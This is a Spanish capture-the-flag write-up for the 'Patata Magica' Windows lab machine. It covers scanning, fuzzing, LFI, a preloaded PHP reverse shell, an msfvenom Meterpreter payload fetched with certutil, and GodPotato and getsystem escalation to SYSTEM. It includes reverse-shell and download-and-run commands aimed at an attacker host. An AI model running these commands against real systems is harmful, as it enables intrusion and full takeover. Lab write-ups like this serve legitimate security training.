---
title: "Patata Magica - TheHackerLabs"
date: 2026-01-24
draft: false
slug: "THL-writeup-patataMagica"
excerpt: "Esta fue una máquina un poco complicada. Después de analizar los escaneos, pasamos directamente a analizar la página web activa en el puerto 80. Ahí podemos identificar una página que es vulnerable a Local File Inclusion (LFI). Además, después de aplicar Fuzzing, identificamos una página que permite subir archivos, siendo que tiene un archivo precargado que resulta ser una Reverse Shell. Utilizamos esa Reverse Shell para ganar acceso principal a la máquina víctima. Revisando los privilegios, vemos que tenemos el SeImpersonatePrivilege, lo que nos permite escalar privilegios de dos formas, siendo la primera usando el comando getsystem de Meterpreter y la segunda usando la herramienta God Potato, siendo así que completamos la máquina."
categories: ["TheHackerLabs", "Easy Machine"]
tags: ["Windows", "Web Enumeration", "Fuzzing", "BurpSuite", "Sniper Attack", "Local File Inclusion (LFI)", "Meterpreter Getsystem Command Privilege Escalation", "God Potato Attack", "Privesc - Meterpreter GetSystem Command Privilege Escalation", "Privesc - God Potato Attack", "OSCP Style", "Metasploit Framework"]
tools:
  - "ping"
  - "nmap"
  - "arp-scan"
  - "wappalizer"
  - "ffuf"
  - "gobuster"
  - "BurpSuite"
  - "Intruder"
  - "rlwrap"
  - "nc"
  - "whoami"
  - "systeminfo"
  - "msfvenom"
  - "python3"
  - "certutil.exe"
  - "Metasploit Framework (msfconsole)"
  - "Módulo: exploit/multi/handler"
  - "getsystem"
  - "shell"
  - "type"
  - "GodPotato-NET2.exe"
  - "echo"
  - "reg query"
links:
  - "https://github.com/danielmiessler/SecLists/releases/tag/2025.3"
  - "https://github.com/danielmiessler/SecLists/pull/1199"
  - "https://ohpe.it/juicy-potato/CLSID/Windows_10_Pro/"
  - "https://github.com/BeichenDream/GodPotato"
  - "https://medium.com/@iamkumarraj/godpotato-empowering-windows-privilege-escalation-techniques-400b88403a71"
showtoc: true
header:
  teaser: "/assets/images/THL-writeup-patataMagica/patatamagica.png"
---

## Recopilación de Información {#Recopilacion}

### Descubrimiento de Hosts {#Hosts}

Hagamos un descubrimiento de hosts para encontrar a nuestro objetivo.

Lo haremos primero con **nmap**:
```bash
nmap -sn 192.168.100.0/24
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-24 12:46 -0600
...
MAC Address: XX (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.4
Host is up (0.0012s latency).
Nmap done: 256 IP addresses (4 hosts up) scanned in 2.10 seconds
```

Vamos a probar la herramienta **arp-scan**:
```bash
arp-scan -I eth0 -g 192.168.56.0/24
Interface: eth0, type: EN10MB, MAC: XX, IPv4: Tu_IP
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.56.4	XX:XX:XX:XX:XX:XX	PCS Systemtechnik GmbH

3 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.211 seconds (115.78 hosts/sec). 3 responded
```

Encontramos nuestro objetivo y es: `192.168.56.4`.

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 192.168.56.4
PING 192.168.56.4 (192.168.56.4) 56(84) bytes of data.
64 bytes from 192.168.56.4: icmp_seq=1 ttl=128 time=6.86 ms
64 bytes from 192.168.56.4: icmp_seq=2 ttl=128 time=1.16 ms
64 bytes from 192.168.56.4: icmp_seq=3 ttl=128 time=1.08 ms
64 bytes from 192.168.56.4: icmp_seq=4 ttl=128 time=0.860 ms

--- 192.168.56.4 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3035ms
rtt min/avg/max/mdev = 0.860/2.489/6.861/2.526 ms
```
Por el TTL sabemos que la máquina usa **Windows**, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.56.4 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-24 14:53 -0600
Initiating ARP Ping Scan at 14:53
Scanning 192.168.56.4 [1 port]
Completed ARP Ping Scan at 14:53, 0.07s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 14:53
Scanning 192.168.56.4 [65535 ports]
Discovered open port 135/tcp on 192.168.56.4
Discovered open port 80/tcp on 192.168.56.4
Discovered open port 445/tcp on 192.168.56.4
Discovered open port 443/tcp on 192.168.56.4
Discovered open port 139/tcp on 192.168.56.4
Discovered open port 7680/tcp on 192.168.56.4
Discovered open port 47001/tcp on 192.168.56.4
Discovered open port 49668/tcp on 192.168.56.4
Discovered open port 49667/tcp on 192.168.56.4
Discovered open port 49664/tcp on 192.168.56.4
Discovered open port 5040/tcp on 192.168.56.4
Discovered open port 49669/tcp on 192.168.56.4
Discovered open port 49666/tcp on 192.168.56.4
Discovered open port 49665/tcp on 192.168.56.4
Discovered open port 49670/tcp on 192.168.56.4
Discovered open port 5985/tcp on 192.168.56.4
Completed SYN Stealth Scan at 14:53, 19.90s elapsed (65535 total ports)
Nmap scan report for 192.168.56.4
Host is up, received arp-response (0.0068s latency).
Scanned at 2026-01-24 14:53:12 CST for 20s
Not shown: 51810 closed tcp ports (reset), 13709 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE      REASON
80/tcp    open  http         syn-ack ttl 128
135/tcp   open  msrpc        syn-ack ttl 128
139/tcp   open  netbios-ssn  syn-ack ttl 128
443/tcp   open  https        syn-ack ttl 128
445/tcp   open  microsoft-ds syn-ack ttl 128
5040/tcp  open  unknown      syn-ack ttl 128
5985/tcp  open  wsman        syn-ack ttl 128
7680/tcp  open  pando-pub    syn-ack ttl 128
47001/tcp open  winrm        syn-ack ttl 128
49664/tcp open  unknown      syn-ack ttl 128
49665/tcp open  unknown      syn-ack ttl 128
49666/tcp open  unknown      syn-ack ttl 128
49667/tcp open  unknown      syn-ack ttl 128
49668/tcp open  unknown      syn-ack ttl 128
49669/tcp open  unknown      syn-ack ttl 128
49670/tcp open  unknown      syn-ack ttl 128
MAC Address: XX (Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 20.10 seconds
           Raw packets sent: 98198 (4.321MB) | Rcvd: 51827 (2.073MB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Vemos varios puertos abiertos, pero los de interés para nosotros sería el **puerto 80, 135, 443, 445 y 5985**.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sCV -p 80,135,139,443,445,5040,5985,7680,47001,49664,49665,49666,49667,49668,49669,49670 192.168.56.4 -oN targeted
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-24 14:54 -0600
Nmap scan report for 192.168.56.4
Host is up (0.0026s latency).

PORT      STATE SERVICE       VERSION
80/tcp    open  http          Apache httpd 2.4.58 ((Win64) OpenSSL/3.1.3 PHP/8.2.12)

| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Curiosidades CTF
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      Apache httpd 2.4.58 ((Win64) OpenSSL/3.1.3 PHP/8.2.12)

|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
|_ssl-date: TLS randomness does not represent time
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Curiosidades CTF
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
| tls-alpn: 
|_  http/1.1
445/tcp   open  microsoft-ds?
5040/tcp  open  unknown
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
7680/tcp  open  pando-pub?
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
MAC Address: XX (Oracle VirtualBox virtual NIC)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:

| smb2-time: 
|   date: 2026-01-24T21:05:26
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_clock-skew: 8m05s
|_nbstat: NetBIOS name: PATATA-MAGICA, NetBIOS user: <unknown>, NetBIOS MAC: XX (Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 172.26 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

Vemos varias cosas gracias a este escaneo:
* La página web activa en el **puerto 80** está usando **Apache2** y **PHP**.
* La página web activa en el **puerto 443** tiene lo mismo que la del **puerto 80**.
* El **servicio SMB** necesita credenciales válidas, aunque no son necesarias para leer los archivos compartidos.

Primero, analicemos la página web activa del **puerto 80**.

## Análisis de Vulnerabilidades {#Analisis}

### Analizando Servicio HTTP {#HTTP}

Entremos:

<p align="center">
<img src="/assets/images/THL-writeup-patataMagica/Captura1.png">
</p>

Parece ser una página dedicada a juegos matematicos.

Veamos qué nos dice **Wappalizer**:

<p align="center">
<img src="/assets/images/THL-writeup-patataMagica/Captura2.png">
</p>

Como lo mencionaba, se está utilizando **Apache2** y **PHP**, algo que nos puede ayudar más adelante.

Revisando una de las páginas que podemos visitar, parece que hay una que muestra archivos de texto con contenido curioso:

<p align="center">
<img src="/assets/images/THL-writeup-patataMagica/Captura3.png">
</p>

Observa que al escoger cualquier archivo, la página utiliza el parámetro `file=` y luego el nombre del archivo para mostrar su contenido:

<p align="center">
<img src="/assets/images/THL-writeup-patataMagica/Captura4.png">
</p>

Esto puede ser un indicio de una vulnerabilidad, pues si podemos apuntar a otros archivos dentro o fuera del path donde se almacenan los archivos de la página web, estaríamos ante un **LFI** o **Directory Traversal**.

Además, nos dejan una pista de esto en el archivo de texto **videojuegos.txt**:

<p align="center">
<img src="/assets/images/THL-writeup-patataMagica/Captura5.png">
</p>

Antes de probar cualquier cosa, apliquemos **Fuzzing** por si encontramos algo oculto.

### Fuzzing {#fuzz}

Primero probemos con la herramienta **ffuf**:
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/combined_directories.txt:FUZZ -u http://192.168.56.4/FUZZ -t 300 -mc 200,301

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.56.4/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/combined_directories.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 300
 :: Matcher          : Response status: 200,301
________________________________________________

uploads                 [Status: 301, Size: 338, Words: 22, Lines: 10, Duration: 402ms]
Uploads                 [Status: 301, Size: 338, Words: 22, Lines: 10, Duration: 2ms]
UPLOADS                 [Status: 301, Size: 338, Words: 22, Lines: 10, Duration: 90ms]
favicon.ico             [Status: 200, Size: 199139, Words: 760, Lines: 652, Duration: 7ms]
index.php               [Status: 200, Size: 4241, Words: 306, Lines: 100, Duration: 62ms]
robots.txt              [Status: 200, Size: 223, Words: 36, Lines: 3, Duration: 26ms]
.                       [Status: 200, Size: 4241, Words: 306, Lines: 100, Duration: 48ms]
UpLoads                 [Status: 301, Size: 338, Words: 22, Lines: 10, Duration: 43ms]
:: Progress: [128623/128623] :: Job [1/1] :: 216 req/sec :: Duration: [0:02:54] :: Errors: 929 ::
```

| Parámetros | Descripción |
|---|---|
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-u*       | Para indicar la URL a utilizar. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-mc*	     | Para aplicar un flitro que solo muestra resultados con un código de estado especifico. |

Ahora probemos con **gobuster**:
```bash
gobuster dir -u http://192.168.56.4 -w /usr/share/wordlists/seclists/Discovery/Web-Content/combined_directories.txt -t 300 --ne
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.4
[+] Method:                  GET
[+] Threads:                 300
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/combined_directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
uploads              (Status: 301) [Size: 338] [--> http://192.168.56.4/uploads/]
favicon.ico          (Status: 200) [Size: 199139]
index.php            (Status: 200) [Size: 4241]
robots.txt           (Status: 200) [Size: 223]
examples             (Status: 503) [Size: 401]
UpLoads              (Status: 301) [Size: 338] [--> http://192.168.56.4/UpLoads/]
...
Progress: 128623 / 128623 (100.00%)
===============================================================
Finished
===============================================================
```

| Parámetros | Descripción |
|---|---|
| *-u*       | Para indicar la URL a utilizar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *--ne*     | Para que no muestre errores. |

Encontramos un directorio llamado `/uploads`, pero al visitarlo, veremos lo siguiente:

<p align="center">
<img src="/assets/images/THL-writeup-patataMagica/Captura6.png">
</p>

Pero si vemos el código fuente, nos darán una pista clara:

<p align="center">
<img src="/assets/images/THL-writeup-patataMagica/Captura7.png">
</p>

Tenemos que aplicar **LFI**.

Por último, haremos **Fuzzing** para encontrar **archivos PHP**:
```bash
ffuf -w /usr/share/wordlists/seclists/Miscellaneous/lang-spanish.txt -u http://192.168.56.4/FUZZ -t 300 -mc 200,301 -e .php

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.56.4/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Miscellaneous/lang-spanish.txt
 :: Extensions       : .php 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 300
 :: Matcher          : Response status: 200,301
________________________________________________

juegos.php              [Status: 200, Size: 7539, Words: 2775, Lines: 226, Duration: 9ms]
subida.php              [Status: 200, Size: 3235, Words: 737, Lines: 59, Duration: 57ms]
articulos.php           [Status: 200, Size: 3596, Words: 337, Lines: 70, Duration: 1030ms]
:: Progress: [882/882] :: Job [1/1] :: 87 req/sec :: Duration: [0:00:10] :: Errors: 0 ::
```

| Parámetros | Descripción |
|---|---|
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-u*       | Para indicar la URL a utilizar. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-mc*      | Para aplicar un flitro que solo muestra resultados con un código de estado especifico. |
| *-e*       | Para indicar una busqueda de archivos específicos. |

Encontramos una página, así que veámosla:

<p align="center">
<img src="/assets/images/THL-writeup-patataMagica/Captura8.png">
</p>

Con esta página podemos subir archivos y podemos ver que ya hay uno que parece ser una **Reverse Shell**.

Analicemos esta página.

### Analizando Página de Subida de Archivos {#Subida}

Si subimos un archivo, vemos que aparece dentro de la lista de archivos que se subieron:

<p align="center">
<img src="/assets/images/THL-writeup-patataMagica/Captura9.png">
</p>

Al ver esto, puede que se acepten **archivos PHP**, lo que nos permitiría cargar una **Reverse Shell** de **PHP** y así ganar acceso a la máquina.

Pero al intentar subir uno, nos sale un mensaje de error:

<p align="center">
<img src="/assets/images/THL-writeup-patataMagica/Captura10.png">
</p>

Puede que tenga implementadas listas negras o blancas, que evitan subir ciertas extensiones, por lo que podemos averiguar cuáles acepta si aplicamos un **Sniper Attack** con **BurpSuite**.

#### Aplicando Sniper Attack para Identificar Archivos Permitidos por la Página subida.php {#Sniper}

Primero, captura la petición de subida de archivo y mándala al **Intruder**:

<p align="center">
<img src="/assets/images/THL-writeup-patataMagica/Captura11.png">
</p>

Selecciona el nombre de la extensión del archivo que subiste y da clic en el botón **Add**, esto para que quede seleccionada como posición de payload:

<p align="center">
<img src="/assets/images/THL-writeup-patataMagica/Captura12.png">
</p>

Para el payload, le pedí a **ChatGPT** que creara un wordlist con extensiones de **PHP** para identificar si acepta alguna en específico.

Una vez tengas el wordlist, puedes copiarlo y pegarlo con el botón **Paste** o lo puedes guardar en un archivo y cargarlo con el botón **Load**:

<p align="center">
<img src="/assets/images/THL-writeup-patataMagica/Captura13.png">
</p>

Podemos probar otras extensiones, pero enfoquémonos en **PHP** que es el lenguaje que utiliza la página web.

Agregaremos un filtro desde la pestaña **Settings**, ahí baja a la sección **Grep - Match**, dale al botón **Clear** para eliminar los filtros ya agregados y añade el texto que sale cuando un archivo es aceptado:

<p align="center">
<img src="/assets/images/THL-writeup-patataMagica/Captura14.png">
</p>

Ejecuta el ataque con el botón **Start Attack** y observa todas las opciones que sí acepta la página:

<p align="center">
<img src="/assets/images/THL-writeup-patataMagica/Captura15.png">
</p>

Ahora sí, probemos primero el **LFI** y después, veamos si podemos cargar una **Reverse Shell** con alguna de las extensiones que sí acepta.

## Explotación de Vulnerabilidades {#Explotacion}

### Aplicando Local File Inclusion (LFI) para Analizar el Código Fuente de Cada Página y Ganando Acceso a la Máquina Víctima {#LFI}

Podemos probar si este parámetro nos permite ver el código completo de cada página que hemos visto.

Probemos con la página actual:

<p align="center">
<img src="/assets/images/THL-writeup-patataMagica/Captura16.png">
</p>

Observa que ahí mismo se menciona que la página actual es vulnerable a **LFI**.

Si revisamos la página `index.php`, encontraremos unas líneas de código ocultas:

<p align="center">
<img src="/assets/images/THL-writeup-patataMagica/Captura17.png">
</p>

Nos indican que son contraseñas.

Podemos probarlas con **netexec** para saber si funcionan con el **servicio SMB** o con el **servicio WinRM**, pero caeríamos en un **Rabbit Hole**.

Revisemos la página `subida.php`:

<p align="center">
<img src="/assets/images/THL-writeup-patataMagica/Captura18.png">
</p>

<p align="center">
<img src="/assets/images/THL-writeup-patataMagica/Captura19.png">
</p>

Ahí vemos una lista negra de extensiones y de extensiones dobles que no se aceptan. También vemos algunas otras restricciones que nos complicarían el intentar subir una **Reverse Shell**.

Por último, veamos el archivo **revershell.php** que ya estaba precargado:

<p align="center">
<img src="/assets/images/THL-writeup-patataMagica/Captura20.png">
</p>

Esta **Reverse Shell** sirve cuando le pasamos los parámetros **ip** y **port** desde la URL.

Para probarla, levanta un listener usando **rlwrap** y luego **netcat**:
```bash
rlwrap nc -nlvp 443
listening on [any] 443 ...
```

Dale tu IP y el puerto que utilizaste a la ruta directa del archivo `revershell.php`:

<p align="center">
<img src="/assets/images/THL-writeup-patataMagica/Captura21.png">
</p>

Observa la **netcat**:
```batch
rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [192.168.56.4] 49674

PS C:\xampp\htdocs\uploads> whoami
patata-magica\www-data
```
Estamos dentro, pero aún no podremos ver la flag del usuario.

## Post Explotación {#Post}

### Abusando del Privilegio SeImpersonatePrivilege para Escalar Privilegios (Meterpreter Getsystem Command) {#Meterpreter}

Veamos qué privilegios tiene nuestro usuario:
```batch
PS C:\xampp\htdocs\uploads> whoami /priv

INFORMACI?N DE PRIVILEGIOS
--------------------------

Nombre de privilegio          Descripci?n                                  Estado       
============================= ============================================ =============
SeShutdownPrivilege           Apagar el sistema                            Deshabilitado
SeChangeNotifyPrivilege       Omitir comprobaci?n de recorrido             Habilitada   
SeUndockPrivilege             Quitar equipo de la estaci?n de acoplamiento Deshabilitado
SeImpersonatePrivilege        Suplantar a un cliente tras la autenticaci?n Habilitada   
SeCreateGlobalPrivilege       Crear objetos globales                       Habilitada   
SeIncreaseWorkingSetPrivilege Aumentar el espacio de trabajo de un proceso Deshabilitado
SeTimeZonePrivilege           Cambiar la zona horaria                      Deshabilitado
```
Excelente, tenemos el privilegio **SeImpersonatePrivilege**, por lo que la máquina es vulnerable al uso de **Juicy Potato**.

Veamos la versión de **Windows** que se está utilizando:
```batch
PS C:\xampp\htdocs\uploads> systeminfo

Nombre de host:                            PATATA-MAGICA
Nombre del sistema operativo:              Microsoft Windows 10 Enterprise LTSC Evaluation
Versi?n del sistema operativo:             10.0.19044 N/D Compilaci?n 19044
Fabricante del sistema operativo:          Microsoft Corporation
...
```
Es la versión **Windows 10 Enterprise**.

Esto es importante por si tenemos que utilizar un dato extra en el ataque.

Sin embargo, al intentar utilizar **Juicy Potato**, no parece funcionar, por lo que debemos buscar otra manera de escalar privilegios.

Algo que podemos hacer es obtener una sesión de **Meterpreter** para utilizar el módulo `post/multi/recon/local_exploit_suggester` y así identificar un Exploit que podamos usar.

Para esto, vamos a crear una **Reverse Shell** con **msfvenom**:
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=Tu_IP LPORT=4444 -a x64 -f exe -o revShell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7680 bytes
Saved as: revShell.exe
```

Abre un servidor con **Python**:
```bash
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
Te recomiendo crear un directorio propio o puedes guardar el archivo desde donde quieras.

Descarga el binario con **certutil.exe**:
```batch
PS C:\Temp> certutil.exe -urlcache -split -f http://Tu_IP/revShell.exe revShell.exe
****  En l?nea  ****
  0000  ...
  0633
CertUtil: -URLCache comando completado correctamente.
```

Ahora, inicia **Metasploit Framework** y configura el módulo `exploit/multi/handler`:
```bash
msfconsole -q
[*] Starting persistent handler(s)...
msf > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf exploit(multi/handler) > set LHOST Tu_IP
LHOST => Tu_IP
msf exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_tcp
msf exploit(multi/handler) > exploit
[*] Started reverse TCP handler on Tu_IP:4444
```

Ejecuta el binario que es la **Reverse Shell**:
```batch
PS C:\Temp> .\revShell.exe
```

Observa **Metasploit**:
```bash
msf exploit(multi/handler) > exploit
[*] Started reverse TCP handler on Tu_IP:4444 
[*] Sending stage (230982 bytes) to 192.168.56.4
[*] Meterpreter session 9 opened (Tu_IP:4444 -> 192.168.56.4:49691) at 2026-01-25 04:44:36 -0600

meterpreter > getuid
Server username: PATATA-MAGICA\www-data
meterpreter > sysinfo
Computer        : PATATA-MAGICA
OS              : Windows 10 21H2 (10.0 Build 19044).
Architecture    : x64
System Language : es_ES
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows
```
Muy bien, ya tenemos nuestra sesión de **Meterpreter**.

Como tenemos el privilegio **SeImpersonatePrivilege**, es posible que podamos escalar privilegios rápidamente solo usando el comando **getsystem**, ya que este abusa de ese privilegio para convertirse en **Administrador** de la máquina, similar a lo que hace **Juicy Potato**:
```bash
meterpreter > getsystem
...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```
Excelente, pudimos escalar privilegios.

Activa una shell y obtengamos las flags:
```batch
meterpreter > shell
Process 4996 created.
Channel 1 created.
Microsoft Windows [Versi�n 10.0.19044.1288]
(c) Microsoft Corporation. Todos los derechos reservados.

C:\Temp>
C:\Temp>type C:\Users\Hacker\Desktop\User.txt
type C:\Users\Hacker\Desktop\User.txt
...
C:\Temp>type C:\Users\Administrador\Desktop\Root.txt
type C:\Users\Administrador\Desktop\Root.txt
...
```
Con esto, terminamos la máquina.

### Abusando del Privilegio SeImpersonatePrivilege con God Potato para Escalar Privilegios {#GodPotato}

Una opción viable y más moderna es utilizar la versión **God Potato** para abusar del privilegio **SeImpersonatePrivilege** y así escalar privilegios.

Lo puedes descargar aquí:
* <a href="https://github.com/BeichenDream/GodPotato" target="_blank">Repositorio de BeichenDream: GodPotato</a>

Yo utilicé la versión **NET2**.

Una vez que lo descargues, envíalo a la máquina víctima usando un servidor de **Python** y **certutil.exe**.

Probemos si se ejecuta el **God Potato**:
```batch
PS C:\Temp> .\GodPotato-NET2.exe
                                                                                               
    FFFFF                   FFF  FFFFFFF                                                       
   FFFFFFF                  FFF  FFFFFFFF                                                      
  FFF  FFFF                 FFF  FFF   FFF             FFF                  FFF                
  FFF   FFF                 FFF  FFF   FFF             FFF                  FFF                
  FFF   FFF                 FFF  FFF   FFF             FFF                  FFF                
 FFFF        FFFFFFF   FFFFFFFF  FFF   FFF  FFFFFFF  FFFFFFFFF   FFFFFF  FFFFFFFFF    FFFFFF   
 FFFF       FFFF FFFF  FFF FFFF  FFF  FFFF FFFF FFFF   FFF      FFF  FFF    FFF      FFF FFFF  
 FFFF FFFFF FFF   FFF FFF   FFF  FFFFFFFF  FFF   FFF   FFF      F    FFF    FFF     FFF   FFF  
 FFFF   FFF FFF   FFFFFFF   FFF  FFF      FFFF   FFF   FFF         FFFFF    FFF     FFF   FFFF 
 FFFF   FFF FFF   FFFFFFF   FFF  FFF      FFFF   FFF   FFF      FFFFFFFF    FFF     FFF   FFFF 
  FFF   FFF FFF   FFF FFF   FFF  FFF       FFF   FFF   FFF     FFFF  FFF    FFF     FFF   FFFF 
  FFFF FFFF FFFF  FFF FFFF  FFF  FFF       FFF  FFFF   FFF     FFFF  FFF    FFF     FFFF  FFF  
   FFFFFFFF  FFFFFFF   FFFFFFFF  FFF        FFFFFFF     FFFFFF  FFFFFFFF    FFFFFFF  FFFFFFF   
    FFFFFFF   FFFFF     FFFFFFF  FFF         FFFFF       FFFFF   FFFFFFFF     FFFF     FFFF    

Arguments:

	-cmd Required:True CommandLine (default cmd /c whoami)

Example:

GodPotato -cmd "cmd /c whoami" 
GodPotato -cmd "cmd /c whoami"
```
Genial, funciona.

Probemos si funciona la ejecución de comandos:
```batch
PS C:\Temp> .\GodPotato-NET2.exe -cmd "cmd /c whoami"
[*] CombaseModule: 0x140728765054976
[*] DispatchTable: 0x140728767509496
[*] UseProtseqFunction: 0x140728766841264
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] CreateNamedPipe \\.\pipe\d55b38a5-7704-47e9-a2bd-8717d5e77f2b\pipe\epmapper
[*] Trigger RPCSS
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 0000cc02-06e8-ffff-6ea9-d30e843cacd8
[*] DCOM obj OXID: 0xb5568d0d78cffca9
[*] DCOM obj OID: 0xf5ff27142026b657
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\Servicio de red
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 800 Token:0x312  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 4376
```
Muy bien, sí parece estar funcionando.

Abre un listener usando **rlwrap** y luego **netcat**:
```bash
rlwrap nc -nlvp 1337
listening on [any] 1337...
```

Usa la **Reverse Shell** que se muestra en el repositorio:
```batch
PS C:\Temp> .\GodPotato-NET2.exe -cmd "nc -t -e C:\Windows\System32\cmd.exe Tu_IP 1337"
```

Observa la **netcat**:
```batch
nc -nlvp 1337
listening on [any] 1337 ...
connect to [Tu_IP] from (UNKNOWN) [192.168.56.4] 49689
Microsoft Windows [Versi�n 10.0.19044.1288]
(c) Microsoft Corporation. Todos los derechos reservados.

C:\Windows\system32>
```

Aunque el comando **whoami** no parece funcionar, podemos hacer unas cuantas pruebas para ver si realmente somos el **Administrador**, por ejemplo, crear un archivo en algún directorio de uso exclusivo del **Administrador**:
```batch
C:\>echo pwned > C:\Windows\System32\proof.txt
echo pwned > C:\Windows\System32\proof.txt

C:\>type C:\Windows\System32\proof.txt
type C:\Windows\System32\proof.txt
pwned
```

